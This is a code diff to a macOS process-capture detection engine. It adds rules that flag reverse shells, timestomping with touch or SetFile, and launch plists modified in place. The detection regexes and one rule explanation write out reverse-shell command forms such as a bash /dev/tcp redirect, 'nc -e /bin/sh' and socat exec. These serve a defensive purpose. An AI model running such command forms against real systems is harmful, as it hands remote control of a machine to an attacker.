@@ -1,10 +1,10 @@
 import type { CaptureModel, Image, PersistenceItem, ProcId, Process } from '../model/types';
 import { basename, imageAt, normPath, timeMs } from '../model/util';
 import {
-  CURL_SPEC, hasOpt, hasShortFlag, looksLikeUrl, optValues, osascriptArgs, parseOpts, PIPE_LANGS, readsStdin,
+  CURL_SPEC, hasOpt, hasShortFlag, looksLikeUrl, optValues, osascriptArgs, parseOpts, PIPE_LANGS, readsStdin, type OptSpec,
   SECURITY_FIND_SPEC, securityArgs, stagingPlace, tarCreates, WGET_SPEC, type PipeLang,
 } from './args';
-import { PASTE_WINDOW_MS, agentRuntime, originalParentImage, siblings, sourcesAgentSnapshot, underAgentShell } from './context';
+import { PASTE_WINDOW_MS, agentRuntime, originalParentImage, siblings, sourcesAgentSnapshot, sshAncestor, underAgentShell } from './context';
 import { COPY_TOOLS, credentialStore, isBrowserEngine } from './credentials';
 import { fileLedger } from './ledger';
 import { INDICATOR_FAMILIES, matchArgs, matchPath, matchPlist, matchSigning, matchTeam, type Indicator } from './indicators';
@@ -580,9 +580,129 @@ function plistBase(plists: string[]): string {
 
 /** The language an exec'd image reads from a piped stdin, or null. */
 export function pipeLang(img: Image): PipeLang | null {
-  if (img.stdinIsPipe !== true || img.script !== null || !img.args) return null;
+  return img.stdinIsPipe === true ? stdinLang(img) : null;
+}
+
+/** The language of a shell or interpreter image that reads its commands from stdin (no script file, no inline code). */
+function stdinLang(img: Image): PipeLang | null {
+  if (img.script !== null || !img.args) return null;
   const lang = PIPE_LANGS.find(([re]) => re.test(basename(img.path)))?.[1];
   return lang && readsStdin(lang, img.args) ? lang : null;
+}
+
+/** A shell or interpreter reading its commands from a socket: what a reverse shell is from the shell's side. */
+const socketLang = (img: Image): PipeLang | null => (img.stdinIsSocket === true ? stdinLang(img) : null);
+
+const SHELL_NAME = /^(?:sh|bash|zsh|dash|ksh|csh|tcsh)$/;
+const DEV_NET = /\/dev\/(?:tcp|udp)\//;
+/** The shell's own output (and errors) sent to the socket: `>& /dev/tcp/…`, `&> /dev/tcp/…`, or input taken from it with `<&`. */
+const DEV_NET_DUP = /(?:>&|&>|<&)\s*\/dev\/(?:tcp|udp)\//;
+/** A descriptor opened read-write on the socket, to be wired to the shell: `exec 5<>/dev/tcp/…`. */
+const DEV_NET_EXEC = /\bexec\s+(\d+)\s*<>\s*\/dev\/(?:tcp|udp)\//;
+/** A plain redirection to the socket, which only makes a reverse shell together with stdin tied to it (`0>&1`, `0<&1`). */
+const DEV_NET_REDIRECT = /[<>]\s*\/dev\/(?:tcp|udp)\//;
+const STDIN_DUP = /(?:^|[^\d])0\s*[<>]&\s*[12]\b/;
+const NC_NAMES = /^(?:nc|ncat|netcat)$/;
+/** A command word in a shell script: at the start, or after `;`, `|`, `&` or `(`, with or without a folder. */
+const cmdWord = (names: string): RegExp => new RegExp(`(?:^|[;|&(]\\s*)(?:\\S*/)?(?:${names})(?=\\s|$)`);
+const NC_CMD = cmdWord('nc|ncat|netcat');
+const SHELL_CMD = cmdWord('sh|bash|zsh|dash|ksh');
+/** A shell taking its input from a descriptor or a pipe: `sh <&196`, `… | bash`, or `while read line; do $line`. */
+const shellOnFd = (script: string, fd: string): boolean =>
+  new RegExp(`(?:^|[;|&(]\\s*)(?:\\S*/)?(?:sh|bash|zsh|dash|ksh)\\b[^;|&]*[<>]&\\s*${fd}\\b`).test(script)
+  || /\|\s*(?:\S*\/)?(?:sh|bash|zsh|dash|ksh)\b/.test(script)
+  || /\bwhile\s+read\s+\w+[^]*\$\w+/.test(script);
+
+/** Inline-code options per interpreter: the letter that takes code, letters whose value is attached or next, and letters after which the rest is not ours. */
+const INLINE_LANGS: [RegExp, { name: string; inline: string; withValue: string; stop: string }][] = [
+  [/^python[0-9.]*$/, { name: 'python', inline: 'c', withValue: 'WX', stop: 'm' }],
+  [/^perl[0-9.]*$/, { name: 'perl', inline: 'eE', withValue: 'IMmxdi', stop: '' }],
+  [/^ruby[0-9.]*$/, { name: 'ruby', inline: 'e', withValue: 'IrCE', stop: '' }],
+  [/^php[0-9.]*$/, { name: 'php', inline: 'r', withValue: 'cdfzt', stop: '' }],
+];
+/** Code that opens a connection. */
+const CONNECTS = /socket\.socket\(|create_connection\(|\.connect\(|\bconnect\s*\(|IO::Socket|TCPSocket|fsockopen|stream_socket_client/;
+/** Code that hands the connection to a shell: duplicates descriptors, spawns a pty, or runs a shell on them. */
+const HANDS_OFF = /dup2|fileno|pty\.spawn|open\s*\(\s*STD(?:IN|OUT|ERR)|STD(?:IN|OUT)\.reopen|IO\.popen|[<>]&\s*(?:%d|\d)|\/bin\/(?:ba|z|da)?sh\b|\bsh\s+-i\b/;
+
+/** The inline code an interpreter runs (`-c CODE`, `-cCODE`, `-e CODE`…), read only up to its script or module argument. */
+function inlineCode(spec: { inline: string; withValue: string; stop: string }, a: string[]): string[] {
+  const code: string[] = [];
+  for (let i = 0; i < a.length; i++) {
+    const x = a[i]!;
+    if (x === '--' || x === '-' || !x.startsWith('-')) break;
+    if (x.startsWith('--')) continue;
+    for (let k = 1; k < x.length; k++) {
+      const ch = x[k]!;
+      if (spec.stop.includes(ch)) return code;
+      if (spec.inline.includes(ch)) { const v = x.slice(k + 1) || a[++i]; if (v !== undefined) code.push(v); break; }
+      if (spec.withValue.includes(ch)) { if (x.slice(k + 1) === '') i++; break; }
+    }
+  }
+  return code;
+}
+
+/**
+ * The reverse-shell pattern in this image's command line, as a short label, or null. Matching is on words, never on
+ * the host or port, so a cleaned capture (hosts replaced by placeholders) gives the same answer. A bare `/dev/tcp`
+ * port check (`</dev/tcp/db/5432`) ties no shell to the socket and is not a match.
+ */
+export function reverseShellCommand(img: Image): string | null {
+  const n = basename(img.path);
+  const a = rest(img);
+  if (a.length === 0) return null;
+  if (SHELL_NAME.test(n) && hasShortFlag(a, 'c')) {
+    const script = a.join(' ');
+    const fd = DEV_NET_EXEC.exec(script)?.[1];
+    if (DEV_NET.test(script) && (DEV_NET_DUP.test(script) || (fd !== undefined && shellOnFd(script, fd))
+      || (DEV_NET_REDIRECT.test(script) && STDIN_DUP.test(script)))) return '/dev/tcp redirect';
+    if (/\bmk(?:fifo\b|nod\b[^;|&]*\sp\b)/.test(script) && NC_CMD.test(script) && SHELL_CMD.test(script)) return 'fifo + nc';
+    if (/\bzmodload\b[^;|&]*\bzsh\/net\/tcp\b/.test(script) && /\bztcp\b/.test(script)) return 'zsh ztcp';
+    return null;
+  }
+  if (NC_NAMES.test(n)) {
+    // Apple's /usr/bin/nc takes -c for CRLF line endings, so only -e runs a program there.
+    const runs = hasShortFlag(a, 'e') || (n !== 'nc' && hasShortFlag(a, 'c'))
+      || a.some(x => /^--(?:exec|sh-exec)(?:=|$)/.test(x));
+    return runs ? `${n} runs a program` : null;
+  }
+  if (n === 'socat') return a.some(x => /^(?:exec|system):/i.test(x)) ? 'socat exec:' : null;
+  const inline = INLINE_LANGS.find(([re]) => re.test(n))?.[1];
+  if (inline !== undefined) {
+    const code = inlineCode(inline, a).join('\n');
+    if (CONNECTS.test(code) && HANDS_OFF.test(code)) return `${inline.name} socket + shell`;
+  }
+  return null;
+}
+
+/** MITRE technique of the language a reverse-shell command line runs in. */
+function reverseShellMitre(img: Image): string {
+  const n = basename(img.path);
+  return /^python[0-9.]*$/.test(n) ? 'T1059.006' : /^(?:perl|ruby|php)[0-9.]*$/.test(n) ? 'T1059' : 'T1059.004';
+}
+
+/** touch: -A adjust, -d date, -r reference file, -t timestamp take a value. SetFile: -a, -c, -d, -m, -t do. */
+const TOUCH_SPEC: OptSpec = { shortValues: 'Adrt', longValues: [] };
+const SETFILE_SPEC: OptSpec = { shortValues: 'acdmt', longValues: [] };
+
+/**
+ * A strong odd place other than a temporary folder: source builds (Homebrew, pip, node-gyp) unpack and set dates in
+ * /tmp and /var/folders all day, so a temporary folder alone does not make a date change suspicious.
+ */
+const strongNotTemp = (path: string): boolean => {
+  const where = oddLocation(path);
+  return where !== null && where.strength === 'strong' && where.kind !== 'temp';
+};
+
+/** The programs that ran in a capture (every exec'd image), by `normPath(path).toLowerCase()`, built once per model. */
+const programsRunCache = new WeakMap<CaptureModel, Set<string>>();
+function programsRun(m: CaptureModel): Set<string> {
+  const cached = programsRunCache.get(m);
+  if (cached) return cached;
+  const set = new Set<string>();
+  for (const p of m.processes.values()) for (const i of p.images) if (!i.inherited && i.path !== null) set.add(normPath(i.path).toLowerCase());
+  programsRunCache.set(m, set);
+  return set;
 }
 
 /** openssl digest commands, where -d means debug output rather than decode. */
@@ -820,14 +940,17 @@ export const RULES: Rule[] = [
       const unregistered: string[] = [];
       const elsewhere = new Map<string, string>();     // plist -> who its registration is attributed to
       const seen = new Set<string>();
+      const inPlace = new Map<string, boolean>();     // plist first reached by a write -> seen only at a close
       for (const op of p.fileOps) {
-        // A temp file renamed over the plist counts through the rename's destination.
-        const target = op.kind === 'create' ? op.path : op.kind === 'rename' ? op.toPath : undefined;
+        // A temp file renamed over the plist counts through the rename's destination; a write (a `write` event, or a
+        // `close` marked modified) is a plist that already existed, overwritten in place.
+        const target = op.kind === 'create' || op.kind === 'write' ? op.path : op.kind === 'rename' ? op.toPath : undefined;
         if (target === undefined) continue;
         const n = normPath(target);
         const key = n.toLowerCase();
         if (!LAUNCH_DIR.test(n) || seen.has(key)) continue;
         seen.add(key);
+        if (op.kind === 'write') inPlace.set(target, op.via === 'close');
         const items = m.persistence.filter(it => it.kind === 'add' && it.plistPath !== null && normPath(it.plistPath).toLowerCase() === key);
         if (items.length === 0) { unregistered.push(target); continue; }
         const owners = items.map(it => ({ it, owner: persistenceOwner(m, it) }));
@@ -842,8 +965,12 @@ export const RULES: Rule[] = [
       const suffix = elsewhere.size === 0 ? ' No registration event in the capture accounts for it.'
         : unregistered.length === 0 ? ` Its registration in the capture is attributed to ${names}, so that finding is on that row.`
         : ` Some have no registration event in the capture; the registration of the others is attributed to ${names}.`;
+      const shown = (h: string): string => (elsewhere.has(h) ? `${h} (registration attributed to ${elsewhere.get(h)})` : h);
+      const wrote = hits.filter(h => !inPlace.has(h)).map(shown);
+      const modified = hits.filter(h => inPlace.has(h)).map(h => `${shown(h)}${inPlace.get(h) ? ' (seen at close)' : ''}`);
       return {
-        evidence: `wrote ${hits.map(h => (elsewhere.has(h) ? `${h} (registration attributed to ${elsewhere.get(h)})` : h)).join(', ')}`,
+        evidence: [wrote.length > 0 ? `wrote ${wrote.join(', ')}` : null, modified.length > 0 ? `modified in place ${modified.join(', ')}` : null]
+          .filter(Boolean).join('; '),
         mitre: [...new Set([...kinds].flatMap(launchMitre))].sort(),
         explanation: `${plistBase(hits)}${suffix}`,
         ...(only === 'agent' ? { title: 'Launch agent plist written' } : only === 'daemon' ? { title: 'Launch daemon plist written' } : {}),
@@ -869,6 +996,27 @@ export const RULES: Rule[] = [
       const a = rest(img);
       return hasShortFlag(a, 'c') || (hasShortFlag(a, 'd') && a.includes('com.apple.quarantine'))
         ? { evidence: cmdline(img) } : null;
+    },
+  },
+  {
+    id: 'timestomp', title: 'File dates faked', severity: 'low', levels: ['high', 'low'], gated: 'when-low',
+    explanation: "Set a file's dates by hand with `touch -r`, `-t`, `-d` or `-A`, or `SetFile -d` or `-m`, so it looks older than it is or as old as a file around it. High when the file is a launch agent or daemon plist, a program that ran in this capture, or something in a shared, Downloads or hidden folder (not a temporary folder, where source builds set dates all day); the reference file of `touch -r` shows which legitimate item it was made to look like. Build scripts set dates for reproducible output, so any other file is context only. A program that changes dates through the system API instead of these tools leaves no trace in a capture.",
+    mitre: ['T1070.006'], scope: 'image',
+    match: ({ m, img }) => {
+      const n = basename(img.path);
+      const spec = n === 'touch' ? TOUCH_SPEC : n === 'SetFile' ? SETFILE_SPEC : null;
+      if (spec === null || !img.args) return null;
+      const o = parseOpts(rest(img), spec);
+      const dating = n === 'touch' ? ['r', 't', 'd', 'A'] : ['d', 'm'];
+      const set = o.shorts.find(s => dating.includes(s.opt) && s.value !== undefined);
+      if (set === undefined || o.positionals.length === 0) return null;
+      const targets = o.positionals.map(t => resolvePath(t, img.cwd));
+      const ran = programsRun(m);
+      const strong = targets.find(t => LAUNCH_DIR.test(normPath(t)) || ran.has(normPath(t).toLowerCase())
+        || strongNotTemp(t));
+      const target = strong ?? targets[0]!;
+      const how = set.opt === 'r' ? `dated like ${set.value}` : `set to ${set.value}`;
+      return { evidence: `${cmdline(img)}; ${target} ${how}`, severity: strong !== undefined ? 'high' : 'low' };
     },
   },
   {
@@ -901,6 +1049,28 @@ export const RULES: Rule[] = [
           ? "A shell ran commands piped into it (the `curl … | bash` pattern), so there's no script file on disk to inspect."
           : `${n} ran a script piped into it (the \`curl … | ${n}\` pattern), so there's no script file on disk to inspect.`,
       };
+    },
+  },
+  {
+    id: 'reverse-shell', title: 'Reverse shell', severity: 'high', levels: ['high', 'med'],
+    explanation: "A shell or interpreter wired to a network connection, so whoever is at the other end types its commands: a reverse shell. Seen two ways: a shell (or python, perl, ruby) reading its commands from a socket, or a command line that sets one up (`bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh`, `socat … exec:`, a fifo piped through nc, a python or perl one-liner that connects a socket and hands it to a shell). An `ssh -T` session also gives its shell a socket, so a socket shell under sshd is med.",
+    mitre: ['T1059.004', 'T1059.006', 'T1059', 'T1095'], scope: 'image',
+    match: ({ m, p, img, imgIndex }) => {
+      const lang = socketLang(img);
+      // Once per process: macOS /bin/sh re-execs /bin/bash with the same arguments and the same stdin.
+      const socket = lang !== null && !p.images.slice(0, imgIndex).some(i => !i.inherited && socketLang(i) !== null);
+      const before = p.images.slice(0, imgIndex).filter(i => !i.inherited);
+      // The same command line once per process too: /bin/sh re-execs /bin/bash with the arguments it was given.
+      const found = reverseShellCommand(img);
+      const cmd = found !== null && before.some(i => i.args !== null && img.args !== null && i.args.join('\0') === img.args.join('\0')) ? null : found;
+      if (!socket && cmd === null) return null;
+      const viaSsh = socket && cmd === null && sshAncestor(m, p);
+      const evidence = [
+        socket ? `${cmdline(img)} reads its commands from a socket${viaSsh ? ' (under sshd: an ssh -T session looks the same)' : ''}` : null,
+        cmd !== null ? `${cmdline(img)} (${cmd})` : null,
+      ].filter(Boolean);
+      const mitre = [...new Set([...(socket ? [lang!.mitre] : []), ...(cmd !== null ? [reverseShellMitre(img)] : []), 'T1095'])].sort();
+      return { evidence: socket && cmd !== null ? `${evidence[0]}; command line: ${cmd}` : evidence[0]!, severity: viaSsh ? 'med' : 'high', mitre };
     },
   },
   {
